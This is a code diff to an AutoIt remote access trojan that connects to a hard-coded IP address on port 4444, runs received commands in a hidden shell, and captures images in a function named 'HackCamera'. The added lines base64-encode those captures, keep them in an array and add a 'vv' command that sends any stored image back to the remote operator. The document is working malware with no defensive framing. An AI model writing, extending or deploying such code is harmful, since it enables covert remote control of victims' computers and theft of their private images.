@@ -21,10 +21,11 @@
 #include <GUIConstantsEx.au3>
 #include <MsgBoxConstants.au3>
 #include <ScreenCapture.au3>
+#include <Array.au3>
 
 Global Const $HOST = "103.97.127.14"
 Global Const $PORT = 4444
-
+Global $historyImg[0]
 Global $currentDir = @WorkingDir
 Global $socket = -1
 
@@ -45,6 +46,22 @@ Func ConnectToServer()
 	WEnd
 EndFunc
 
+Func AddToDynamicArray(ByRef $a, $v) ;support array function
+    Local $i = UBound($a) 
+    ReDim $a[$i + 1]
+    $a[$i] = $v
+EndFunc
+
+Func BinaryToBase64($bin) ;support function
+    Local $xml = ObjCreate("Msxml2.DOMDocument.3.0")
+    If Not IsObj($xml) Then
+        Return ""
+    EndIf
+    Local $node = $xml.createElement("base64")
+    $node.dataType = "bin.base64"
+    $node.nodeTypedValue = $bin
+    Return $node.text
+EndFunc
 
 Func ExecuteCommand($sCmd)
     Local $pid = Run(@ComSpec & " /c " & $sCmd, "", @SW_HIDE, $STDOUT_CHILD)
@@ -70,6 +87,14 @@ Func HackCamera()
 			WinActivate($hwnd)
 			$pos = WinGetPos($hwnd)
 			_ScreenCapture_Capture(@ScriptDir & "\" & $i & ".jpg", $pos[0], $pos[1], $pos[0] + $pos[2], $pos[1] + $pos[3])
+			Local $file = FileOpen(@ScriptDir & "\" & $i & ".jpg", 16)
+			If $file = -1 Then
+				Exit
+			EndIf
+			Local $data = FileRead($file)
+			FileClose($file)
+			Local $base = BinaryToBase64($data)
+			AddToDynamicArray($historyImg, $base)
 		EndIf
 		Sleep(400)
 	Next
@@ -107,6 +132,11 @@ While 1
 		ElseIf StringLeft($recv, 3) = "cc " Then
 			Local $d = HackCamera()
 			TCPSend($socket, "-------"&$d&"-----" & @CRLF)
+			TCPSend($socket, $currentDir & "> ")
+		ElseIf StringLeft($recv, 3) = "vv " Then
+			Local $get = Number(StringStripWS(StringTrimLeft($recv, 3), 3))
+			Local $baseOut = $historyImg[$get]
+			TCPSend($socket, $baseOut & @CRLF)
 			TCPSend($socket, $currentDir & "> ")
         Else
             Local $cmdOutput = ExecuteCommand($recv)
